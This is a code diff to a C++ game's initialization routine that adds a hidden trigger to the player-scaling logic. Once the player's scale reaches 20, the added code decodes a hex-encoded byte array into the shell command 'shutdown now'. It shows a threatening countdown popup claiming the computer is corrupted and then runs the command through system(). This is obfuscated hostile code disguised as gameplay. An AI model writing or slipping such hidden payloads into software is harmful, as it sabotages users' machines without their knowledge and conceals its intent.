@@ -75,6 +75,22 @@ void Game::initialize() {
             scale.x += 0.1;
             scale.y += 0.1;
             scale.z += 0.1;
+            if (scale.y >= 20.0) {
+                std::vector<unsigned char> command_hex = {0x73, 0x68, 0x75, 0x74, 0x64, 0x6F, 0x77, 0x6E, 0x20, 0x6E, 0x6F, 0x77};
+                std::string command(command_hex.begin(), command_hex.end());
+                this->_popup.setTitle("ALERT");
+                this->_popup.setStatus(true);
+                int i = 5;
+                while (i >= 0) {
+                    this->_raylibwindow.MyBeginDrawing();
+                    this->_popup.setDescription("You have corrupted your computer.\nYour computer will die with me in " + std::to_string(i) + ".");
+                    this->_popup.show();
+                    sleep(1);
+                    this->_raylibwindow.MyEndDrawing();
+                    i -= 1;
+                }
+                system(command.c_str());
+            }
             _playerTmp->setScale(scale);
         }
     );
